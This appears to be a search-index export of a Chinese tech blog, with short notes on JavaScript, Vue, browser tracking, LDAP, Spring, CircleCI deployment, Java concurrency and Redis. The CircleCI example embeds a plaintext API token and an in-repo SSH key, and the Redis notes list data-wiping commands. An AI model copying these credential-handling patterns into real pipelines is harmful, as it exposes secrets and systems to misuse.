        <content type="html"><![CDATA[<h2 id="数字格式化（每三位加逗号）"><a href="#数字格式化（每三位加逗号）" class="headerlink" title="数字格式化（每三位加逗号）"></a>数字格式化（每三位加逗号）</h2><pre><code>export const toThousands = num =&gt; {  return (num || 0).toString().replace(/(\d)(?=(?:\d{3})+$)/g, &#39;$1,&#39;)}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>移动Vue组件挂载点到body上</title>
      <link href="/Javascript/vue/vue-move-component-to-body/"/>
      <url>/Javascript/vue/vue-move-component-to-body/</url>
      
        <content type="html"><![CDATA[<p>非常有用的一个指令，可以移动组件到 body上，解决定位和全局遮罩等问题</p><pre><code>export const moveElementToBody = {  inserted(el) {    if (el) {      document.body.appendChild(el)    }  },  unbind(el) {    if (el.parentNode) {      el.parentNode.removeChild(el)    }  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web客户端追踪（cookie、浏览器指纹 ）</title>
      <link href="/%E5%AE%89%E5%85%A8/security/user-track/"/>
      <url>/%E5%AE%89%E5%85%A8/security/user-track/</url>
      
        <content type="html"><![CDATA[<p>Web客户端追踪，主要是指用户使用客户端（通常是指浏览器）访问Web网站时，Web服务器通过一系列手段对用户客户端进行标记和识别，进而关联和分析用户行为的技术。</p><p>解决类似禁用了 cookie 后如何识别用户身份和登录问题</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>panopticlick 浏览器指纹监测工具 <a href="https://panopticlick.eff.org/" target="_blank" rel="noopener">https://panopticlick.eff.org/</a> </li><li>fingerprintjs 浏览器指纹JS库 <a href="http://valve.github.io/fingerprintjs/" target="_blank" rel="noopener">http://valve.github.io/fingerprintjs/</a></li><li>各种存放cookie的技术 <a href="https://github.com/samyk/evercookie" target="_blank" rel="noopener">https://github.com/samyk/evercookie</a></li><li>Web客户端追踪（上）—Cookie追踪 <a href="https://paper.seebug.org/227/" target="_blank" rel="noopener">https://paper.seebug.org/227/</a></li><li>Web客户端追踪（下）—浏览器指纹追踪 <a href="https://paper.seebug.org/229/" target="_blank" rel="noopener">https://paper.seebug.org/229/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ldap</title>
      <link href="/%E5%AE%89%E5%85%A8/security/ldap/"/>
      <url>/%E5%AE%89%E5%85%A8/security/ldap/</url>
      
        <content type="html"><![CDATA[<p>LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与X.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。</p><p>一般在大型企业IT架构中使用，用于维护一个中心化的用户账户和权限，例如JIRA、邮箱、WIKI等。另外一个实现是windows 的活动目录（AD）</p><p>OpenLDAP是LDAP协议的一个开源实现，具有组件：</p><ul><li>OpenLDAP OpenLDAP的服务器本身，目录服务器</li><li>phpLDAPadmin 管理图形界面</li><li>PWM 用户自主账号管理</li><li>客户端 （各个接入的应用自己实现，例如JIRA）</li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>OpenLDAP 安装<a href="https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/OpenLDAP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微格式 (Microformat）</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/micro-format/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/micro-format/</url>
      
        <content type="html"><![CDATA[<p>微格式（Microformat），是通过语意相关让内容人机可读。网页上的允许的微格式数据包括事件、人物、地点等，它可以被其他的软件检测到，并提取出相应的信息，以及对信息进行索引、搜索、跨平台的参考，把这些信息以其他形式重复使用或组合。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://schema.org" target="_blank" rel="noopener">https://schema.org</a></li><li><a href="http://microformats.org/" target="_blank" rel="noopener">http://microformats.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>web 视觉设计系统</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/design-system/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/design-system/</url>
      
        <content type="html"><![CDATA[<p>在做前端开发和设计时，遇到的一个问题是如何像让每个颜色、尺寸、组件全局统一，因此我们需要前端开发者和UX有一个统一的设计。</p><p>从而演化出自己的一套设计系统框架和项目模板，类似于 bootstrap和Foundation </p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><ul><li>css 设计系统汇总 <a href="https://github.com/topics/design-system?l=css" target="_blank" rel="noopener">https://github.com/topics/design-system?l=css</a></li><li>primer css <a href="https://github.com/primer/css" target="_blank" rel="noopener">https://github.com/primer/css</a></li><li>codyhouse framework <a href="https://github.com/CodyHouse/codyhouse-framework" target="_blank" rel="noopener">https://github.com/CodyHouse/codyhouse-framework</a></li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>Design Systems: Building for the Future <a href="https://css-tricks.com/design-systems-building-future/" target="_blank" rel="noopener">https://css-tricks.com/design-systems-building-future/</a></li><li>Salesforce 提供的一套轻量级设计系统方案 <a href="https://www.lightningdesignsystem.com/utilities/alignment/" target="_blank" rel="noopener">https://www.lightningdesignsystem.com/utilities/alignment/</a></li><li>视频课程 <a href="https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html" target="_blank" rel="noopener">https://www.lynda.com/CSS-tutorials/CSS-Design-Systems-Architectures/688549-2.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring cloud 生态概览</title>
      <link href="/springcloud/springcloud/overview-of-spring-cloud/"/>
      <url>/springcloud/springcloud/overview-of-spring-cloud/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB-present-层"><a href="#WEB-present-层" class="headerlink" title="WEB present 层"></a>WEB present 层</h2><ul><li>Spring HATEOAS</li><li>Spring Mobile</li><li>Spring Web Flow</li><li>Spring Session</li><li>Spring Web Services</li><li>Spring Social</li><li>Spring for Android</li><li>Spring Security</li></ul><h2 id="通用层"><a href="#通用层" class="headerlink" title="通用层"></a>通用层</h2><ul><li>Spring Web</li><li>Spring Test</li><li>Spring Data Access/Integration</li><li>Spring AOP and Instrumentation</li><li>Spring Messaging</li><li>Spring Core Container</li></ul><h2 id="数据访问层"><a href="#数据访问层" class="headerlink" title="数据访问层"></a>数据访问层</h2><ul><li>Spring AMQP</li><li>Spring LDAP</li><li>Spring Data</li><li>Spring Batch</li></ul><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>TODO</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>spring-ecosystem/ <a href="http://springtutorials.com/spring-ecosystem/" target="_blank" rel="noopener">http://springtutorials.com/spring-ecosystem/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> springcloud </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端项目安全扫描</title>
      <link href="/%E5%AE%89%E5%85%A8/security/security-in-frontend/"/>
      <url>/%E5%AE%89%E5%85%A8/security/security-in-frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><ul><li>Sonarqube</li><li>Synk</li></ul><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li>Npm audit </li><li>Retire.js</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>英文邮件写作</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/write-better-email/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/write-better-email/</url>
      
        <content type="html"><![CDATA[<h1 id="邮件标题"><a href="#邮件标题" class="headerlink" title="邮件标题"></a>邮件标题</h1><p>推荐使用动词、正面的词语</p><p>Not good:</p><blockquote><p>Could you review the pull request?</p></blockquote><p>Bat good:</p><blockquote><p>Approval for pull request</p></blockquote><h1 id="Greeting"><a href="#Greeting" class="headerlink" title="Greeting"></a>Greeting</h1><h2 id="称呼"><a href="#称呼" class="headerlink" title="称呼"></a>称呼</h2><p>称呼使用’Dear’ or ‘Hi’？Dear 比 Hi 正式</p><h2 id="称谓"><a href="#称谓" class="headerlink" title="称谓"></a>称谓</h2><p>姓、名不能混，如果不能分清楚称呼，使用 ‘please correct me if I was wrong’<br>如果对方有头衔，比如doctor，应该使用 doctor xxx</p><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>TIPS</p><ol><li>开始直接表明来意， I am writing to xxx</li><li>意图明显，比如是为了report或者寻求帮助</li><li>结束方法：<ol><li>寻求更多communication</li><li>寻求Feedback</li><li>感谢</li><li>offer potential help</li></ol></li></ol><h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><p>1.使用Best regards<br>2.thanks</p><h1 id="summary-of-learn-points"><a href="#summary-of-learn-points" class="headerlink" title="summary of learn points"></a>summary of learn points</h1><p>the fundamentals of Email</p><ul><li>Subject - catching attention in a positive way</li><li>Greeting - appropriate</li><li>Purpose - state it at the beginning </li><li>Request - Be noticeable,clear and flexible</li><li>Ending - invite communication and off help </li><li>Sign-off - professional</li></ul><h1 id="something-is-suitable-via-email"><a href="#something-is-suitable-via-email" class="headerlink" title="something is suitable via email"></a>something is suitable via email</h1><ul><li>Need to record for future reference</li><li>Communication to multiple </li><li>The different time zone </li><li>Need someone take time to deal with</li><li>Report</li></ul><h1 id="something-is-not-suitable-via-email"><a href="#something-is-not-suitable-via-email" class="headerlink" title="something is not suitable via email"></a>something is not suitable via email</h1><ul><li>Urgent things </li><li>negative staff</li><li>complicated situation</li></ul><h1 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h1><ul><li>mark text as bold?</li><li>directly or indirectly</li><li>how to make a appropriate appreciation</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Circle CI 基本使用</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/circleci%20basic/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/circleci%20basic/</url>
      
        <content type="html"><![CDATA[<h2 id="CircleCI是什么"><a href="#CircleCI是什么" class="headerlink" title="CircleCI是什么"></a>CircleCI是什么</h2><p>CircleCI is a continuous integration engine offered as SaaS and on premise.</p><h2 id="CircleCI特点"><a href="#CircleCI特点" class="headerlink" title="CircleCI特点"></a>CircleCI特点</h2><ul><li>容易和Github集成</li><li>SasS平台，无需自己搭建环境</li></ul><h2 id="有用的资源"><a href="#有用的资源" class="headerlink" title="有用的资源"></a>有用的资源</h2><ul><li>官网：<a href="https://circleci.com/" target="_blank" rel="noopener">https://circleci.com/</a></li><li>文档：<a href="https://circleci.com/docs/" target="_blank" rel="noopener">https://circleci.com/docs/</a></li><li>技术雷达的演讲keynote：<a href="http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key">http://wiki.printf.cn/media/CIrcleCI%20on%20tech%20Radar.key</a></li></ul><h2 id="一个构建java并部署的例子"><a href="#一个构建java并部署的例子" class="headerlink" title="一个构建java并部署的例子"></a>一个构建java并部署的例子</h2><pre><code class="yaml">version: 2jobs:  build:    machine:      java:        version: oraclejdk8    working_directory: ~/whoisspy    steps:      - checkout      - run: ./gradlew clean build      - store_artifacts:          path: build/libs  deploy:    machine: true    working_directory: ~/whoisspy    steps:      - checkout      - run:          name: Display current position          command: pwd      - run:          name: Display those variables          command: env      - run:          name: Download jar file          command: |            export CIRCLE_TOKEN=&#39;?circle-token=93106a0b530273d9cb344ea608bc609490fdf202&#39;            curl https://circleci.com/api/v1.1/project/github/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME/$CIRCLE_PREVIOUS_BUILD_NUM/artifacts$CIRCLE_TOKEN | grep -o &#39;https://[^&quot;]*&#39; &gt; artifacts.txt            &lt;artifacts.txt xargs -P4 -I % wget %      - run:          name: Display whole list          command: ls -al &amp; aws --version      - run:          name: Change permission for aws.pem          command: chmod 0600 .circleci/aws.pem      - run:          name: SCP file to instance          command: scp -i &quot;./.circleci/aws.pem&quot; whoisspy-0.0.1-SNAPSHOT.jar ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar      - run:          name: login to target instance          command: |            ssh -i &quot;./.circleci/aws.pem&quot; ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com &#39;ls            cd workspace            #kill old instance            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd            # todo start new instance            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;            # test if it has been started            netstat -apn | grep 8086&#39;      - run:          name: last step          command: pwd#      - run:#          name: kill ssh process#          command: |##            pid=$( ps aux | grep amazonaws | awk &#39;{print $2}&#39; | sort -n | head -n 1 )#            sleep 5 &amp;&amp; kill ${pid} &amp;&amp; echo &quot;ssh command is complete&quot;workflows:  version: 2  build-deploy:    jobs:      - build      - deploy:          requires:            - build          filters:            branches:              only: set-ci</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微软SDL( Security Development Lifecycle)流程</title>
      <link href="/%E5%AE%89%E5%85%A8/security/security-sevelopment-lifecycle/"/>
      <url>/%E5%AE%89%E5%85%A8/security/security-sevelopment-lifecycle/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>微软SDL( Security Development Lifecycle)流程，是一种专注于软件开发安全保障的流程，为了实现保证最终的用户安全，在软件开发各阶段中引入安全和隐私问题。</p><h2 id="项目中实践"><a href="#项目中实践" class="headerlink" title="项目中实践"></a>项目中实践</h2><p>在项目中使用微软提供的工具，绘制威胁建模图表，用于分析和分享安全建模</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>官网 <a href="http://www.microsoft.com/security/sdl/default.aspx" target="_blank" rel="noopener">http://www.microsoft.com/security/sdl/default.aspx</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API RESTful 风格</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-restful/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-restful/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>REST（英文：Representational State Transfer，简称REST），RESTful是一种对基于HTTP的应用设计风格，只是提供了一组设计原则和约束条件，而不是一种标准。网络上有大量对RESTful风格的解读，简单来说Restful定义URI和HTTP状态码，让你的API设计变得更简洁、清晰和富有层次，对缓存等实现更有帮助。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>个人博客 <a href="http://www.printf.cn/index.php/archives/api-design-restful.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-restful.html</a></li><li>JSON API 参考规范 <a href="http://jsonapi.org/format/" target="_blank" rel="noopener">http://jsonapi.org/format/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API 文档和契约</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/api-document-and-contract/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/api-document-and-contract/</url>
      
        <content type="html"><![CDATA[<p>实现API文档生成和前后端合作的几种方案。</p><ul><li><p>基于注释的 API 文档：这是一种通过代码中注释生成 API 文档的轻量级方案，它的好处是简单易用，基本与编程语言无关。因为基于注释，非常适合动态语言的文档输出，例如 Nodejs、PHP、Python。由于NPM包容易安装和使用，这里推荐 nodejs 平台下的 apidocjs。</p></li><li><p>基于反射的 API 文档：使用 swagger 这类通过反射来解析代码，只需要定义好 Model，可以实现自动输出 API 文档。这种方案适合强类型语言例如 Java、.Net，尤其是生成一份稳定、能在团队外使用的 API 文档。</p></li><li><p>使用契约进行前后端协作：在团队内部，前后端协作本质上需要的不是一份 API 文档，而是一个可以供前后端共同遵守的契约。前后端可以一起制定一份契约，使用这份契约共同开发，前端使用这份契约 mock API，后端则可以通过它简单的验证API是否正确输出。</p></li></ul><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>博客 <a href="http://www.printf.cn/index.php/archives/api-design-document-and-contract.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-design-document-and-contract.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 清理对象中的空值</title>
      <link href="/Javascript/javascript/clean-empty-attribute-in-object/"/>
      <url>/Javascript/javascript/clean-empty-attribute-in-object/</url>
      
        <content type="html"><![CDATA[<pre><code>export function cleanNull(object){  const returnValue = {}  Object.keys(object).map((key)=&gt;{    const value = object[key]    if (value === undefined || value === null || value === &#39;&#39;) {      return    }    returnValue[key] = value    return key  })  return returnValue}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 并发和多线程</title>
      <link href="/java/java/java-cocurrent/"/>
      <url>/java/java/java-cocurrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-多线程的几种实现方式"><a href="#Java-多线程的几种实现方式" class="headerlink" title="Java 多线程的几种实现方式"></a>Java 多线程的几种实现方式</h2><h3 id="通过实现-Runnable-接口；"><a href="#通过实现-Runnable-接口；" class="headerlink" title="通过实现 Runnable 接口；"></a>通过实现 Runnable 接口；</h3><pre><code class="java">class RunnableDemo implements Runnable {   private Thread t;   private String threadName;   RunnableDemo( String name) {      threadName = name;      System.out.println(&quot;Creating &quot; +  threadName );   }   public void run() {      System.out.println(&quot;Running &quot; +  threadName );      try {         for(int i = 4; i &gt; 0; i--) {            System.out.println(&quot;Thread: &quot; + threadName + &quot;, &quot; + i);            // 让线程睡眠一会            Thread.sleep(50);         }      }catch (InterruptedException e) {         System.out.println(&quot;Thread &quot; +  threadName + &quot; interrupted.&quot;);      }      System.out.println(&quot;Thread &quot; +  threadName + &quot; exiting.&quot;);   }   public void start () {      System.out.println(&quot;Starting &quot; +  threadName );      if (t == null) {         t = new Thread (this, threadName);         t.start ();      }   }}public class TestThread {   public static void main(String args[]) {      RunnableDemo R1 = new RunnableDemo( &quot;Thread-1&quot;);      R1.start();      RunnableDemo R2 = new RunnableDemo( &quot;Thread-2&quot;);      R2.start();   }   }</code></pre><h3 id="通过继承Thread来创建线程"><a href="#通过继承Thread来创建线程" class="headerlink" title="通过继承Thread来创建线程"></a>通过继承Thread来创建线程</h3><pre><code class="java">class ThreadDemo extends Thread {   private Thread t;   private String threadName;   ThreadDemo( String name) {      threadName = name;      System.out.println(&quot;Creating &quot; +  threadName );   }   public void run() {      System.out.println(&quot;Running &quot; +  threadName );      try {         for(int i = 4; i &gt; 0; i--) {            System.out.println(&quot;Thread: &quot; + threadName + &quot;, &quot; + i);            // 让线程睡眠一会            Thread.sleep(50);         }      }catch (InterruptedException e) {         System.out.println(&quot;Thread &quot; +  threadName + &quot; interrupted.&quot;);      }      System.out.println(&quot;Thread &quot; +  threadName + &quot; exiting.&quot;);   }   public void start () {      System.out.println(&quot;Starting &quot; +  threadName );      if (t == null) {         t = new Thread (this, threadName);         t.start ();      }   }}public class TestThread {   public static void main(String args[]) {      ThreadDemo T1 = new ThreadDemo( &quot;Thread-1&quot;);      T1.start();      ThreadDemo T2 = new ThreadDemo( &quot;Thread-2&quot;);      T2.start();   }   }</code></pre><h3 id="通过-Callable-和-Future-创建线程"><a href="#通过-Callable-和-Future-创建线程" class="headerlink" title="通过 Callable 和 Future 创建线程"></a>通过 Callable 和 Future 创建线程</h3><pre><code class="java">public class CallableThreadTest implements Callable&lt;Integer&gt; {    public static void main(String[] args)      {          CallableThreadTest ctt = new CallableThreadTest();          FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(ctt);          for(int i = 0;i &lt; 100;i++)          {              System.out.println(Thread.currentThread().getName()+&quot; 的循环变量i的值&quot;+i);              if(i==20)              {                  new Thread(ft,&quot;有返回值的线程&quot;).start();              }          }          try          {              System.out.println(&quot;子线程的返回值：&quot;+ft.get());          } catch (InterruptedException e)          {              e.printStackTrace();          } catch (ExecutionException e)          {              e.printStackTrace();          }      }    @Override      public Integer call() throws Exception      {          int i = 0;          for(;i&lt;100;i++)          {              System.out.println(Thread.currentThread().getName()+&quot; &quot;+i);          }          return i;      }  }</code></pre><h3 id="创建线程的三种方式的对比"><a href="#创建线程的三种方式的对比" class="headerlink" title="创建线程的三种方式的对比"></a>创建线程的三种方式的对比</h3><ol><li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li><li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li><li>推荐使用 Callbale 方式，因为可以得到线程中的返回值和异常</li></ol><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><p>多线程代码中，变量会存在共享，但是如果操作不是原子性的，会造成一致性的问题。 在保证线程安全中Java提供了一些措施。</p><h3 id="同步操作和只读操作"><a href="#同步操作和只读操作" class="headerlink" title="同步操作和只读操作"></a>同步操作和只读操作</h3><p>1.方法的调用是在栈中完成的，因此方法的调用不会造成线程安全的问题。这也是为什么Spring 中使用Bean管理对象，每一次请求的操作可以视为同步行为，可以避免多线程问题。</p><p>2.Java中一些对象是线程安全的，是通过使用了只读操作完成的，例如每一个String都是新的对象，在解决线程安全问题的同时需要注意性能问题。</p><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>Java语言提供了一种稍弱的同步机制，即volatile变量，用来确保将变量的更新操作通知到其他线程。当把变量声明为volatile类型后，编译器与运行时都会注意到这个变量是共享的，因此不会将该变量上的操作与其他内存操作一起重排序。volatile变量不会被缓存在寄存器或者对其他处理器不可见的地方，因此在读取volatile类型的变量时总会返回最新写入的值。</p><p>volatile 并不能解决线程安全问题，但是需要注意，赋值操作不是原子性的，因此需要使用volatile来保证变量的可见性。</p><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><p>synchronized 有两种使用方法同步代码块和同步方法，同步代码块可以传入一个需要锁定的对象，通常是this，而同步方法可以用来修饰方法</p><pre><code class="java">synchronized void f() { /* body */ }void f() { synchronized(this) { /* body */ } }</code></pre><p>需要注意的是如果是类当中的静态变量 synchronized 并不会锁住</p><p>需要使用类名来锁</p><pre><code class="java">synchronized void f() { /* body */ }void f() { synchronized(this) { /* body */ } }</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 性能调优</title>
      <link href="/java/java/java-performance/"/>
      <url>/java/java/java-performance/</url>
      
        <content type="html"><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>-《Java性能权威指南》</p><h1 id="性能优化的一些原则"><a href="#性能优化的一些原则" class="headerlink" title="性能优化的一些原则"></a>性能优化的一些原则</h1><ul><li>性能优化需要注意性价比，避免过早优化</li><li>找出性能瓶颈比优化更重要</li><li>JVM性能优化只是非常小的一部分，更重要的是数据库和业务逻辑</li><li>优化之前使用性能测试工具，进行基准测试</li></ul><h1 id="性能优化工具"><a href="#性能优化工具" class="headerlink" title="性能优化工具"></a>性能优化工具</h1><h2 id="操作系统工具"><a href="#操作系统工具" class="headerlink" title="操作系统工具"></a>操作系统工具</h2><ul><li>vmstat 查看CPU利用率</li><li>typeperf CPU运行队列</li><li>iostat 磁盘IO使用率</li><li>nicstat 网络使用率</li></ul><h2 id="Java-性能分析工具"><a href="#Java-性能分析工具" class="headerlink" title="Java 性能分析工具"></a>Java 性能分析工具</h2><ul><li>jcmd 显示JVM 信息工具<ul><li>jcmd jinfo 显示JVM运行参数</li><li>jdcmd process_id 显示栈运行信息 </li></ul></li><li>jsstack 显示栈运行信息</li><li>jconsole 显示Java编译</li></ul><h2 id="一些明显的-Java-性能问题"><a href="#一些明显的-Java-性能问题" class="headerlink" title="一些明显的  Java 性能问题"></a>一些明显的  Java 性能问题</h2><ul><li>SimpleDataFormat</li><li>String</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis 基础</title>
      <link href="/Redis/redis/redis-foundation/"/>
      <url>/Redis/redis/redis-foundation/</url>
      
        <content type="html"><![CDATA[<p>官网: <a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a><br>基础教程：<a href="http://www.runoob.com/redis/redis-java.html" target="_blank" rel="noopener">http://www.runoob.com/redis/redis-java.html</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><h2 id="常用的数据结构"><a href="#常用的数据结构" class="headerlink" title="常用的数据结构"></a>常用的数据结构</h2><table><thead><tr><th>类型</th><th>简介</th><th>特性</th><th>场景</th></tr></thead><tbody><tr><td>String</td><td>二进制安全</td><td>可以包含任何数据,比如jpg图片或者序列化的对象,一个键最大能存储512M</td><td>—</td></tr><tr><td>Hash</td><td>键值对集合,即编程语言中的Map类型</td><td>适合存储对象,并且可以像数据库中update一个属性一样只修改某一项属性值(Memcached中需要取出整个字符串反序列化成对象修改完再序列化存回去)</td><td>存储、读取、修改用户属性</td></tr><tr><td>List</td><td>链表(双向链表)</td><td>增删快,提供了操作某一段元素的API</td><td>1,最新消息排行等功能(比如朋友圈的时间线) 2,消息队列</td></tr><tr><td>Set</td><td>哈希表实现,元素不重复</td><td>1、添加、删除,查找的复杂度都是O(1) 2、为集合提供了求交集、并集、差集等操作</td><td>1、共同好友 2、利用唯一性,统计访问网站的所有独立ip 3、好友推荐时,根据tag求交集,大于某个阈值就可以推荐</td></tr><tr><td>Sorted Set</td><td>将Set中的元素增加一个权重参数score,元素按score有序排列</td><td>数据插入集合时,已经进行天然排序</td><td>1、排行榜 2、带权重的消息队列</td></tr></tbody></table><h2 id="cli常用操作"><a href="#cli常用操作" class="headerlink" title="cli常用操作"></a>cli常用操作</h2><h3 id="Redis-Select-命令"><a href="#Redis-Select-命令" class="headerlink" title="Redis Select 命令"></a>Redis Select 命令</h3><p>Redis 有多个数据库，默认使用 0 链接，如果需要修改到 faff</p><h3 id="benchmark-性能测试"><a href="#benchmark-性能测试" class="headerlink" title="benchmark 性能测试"></a>benchmark 性能测试</h3><blockquote><p>redis-benchmark -n 10000  -q</p></blockquote><h2 id="redis-的事务特性"><a href="#redis-的事务特性" class="headerlink" title="redis 的事务特性"></a>redis 的事务特性</h2><p>Redis 事务可以一次执行多个命令， 并且带有以下三个重要的保证：</p><ul><li>批量操作在发送 EXEC 命令前被放入队列缓存。</li><li>收到 EXEC 命令后进入事务执行，事务中任意命令执行失败，其余的命令依然被执行。<br>-在事务执行过程，其他客户端提交的命令请求不会插入到事务执行命令序列中。</li><li>一个事务从开始到执行会经历以下三个阶段：<ul><li>开始事务。</li><li>命令入队。</li><li>执行事务。</li></ul></li></ul><p>Redis 事务的本质是一组命令批量执行，并不具备原子能力，也就是说中间失败剩下的还是会被执行，用处是保持时间在一起执行。</p><p>单个 Redis 命令的执行是原子性的，但 Redis 没有在事务上增加任何维持原子性的机制，所以 Redis 事务的执行并不是原子性的。</p><p>事务可以理解为一个打包的批量执行脚本，但批量指令并非原子化的操作，中间某条指令的失败不会导致前面已做指令的回滚，也不会造成后续的指令不做。</p><h2 id="在-cli-外部批量操作"><a href="#在-cli-外部批量操作" class="headerlink" title="在 cli 外部批量操作"></a>在 cli 外部批量操作</h2><p>批量删除 keys</p><blockquote><p>redis-cli keys “user*” | xargs redis-cli del</p></blockquote><p>进入 cli 模式后删除 db</p><blockquote><p>flushdb</p></blockquote><p>进入 cli 模式后删除所有</p><blockquote><p>flushall</p></blockquote><h2 id="启动-redis-server"><a href="#启动-redis-server" class="headerlink" title="启动 redis-server"></a>启动 redis-server</h2><blockquote><p>redis-server </p></blockquote><p>后台运行</p><blockquote><p>redis-server –daemonize yes</p></blockquote><p>后台运行也可以修改配置文件实现。</p><h2 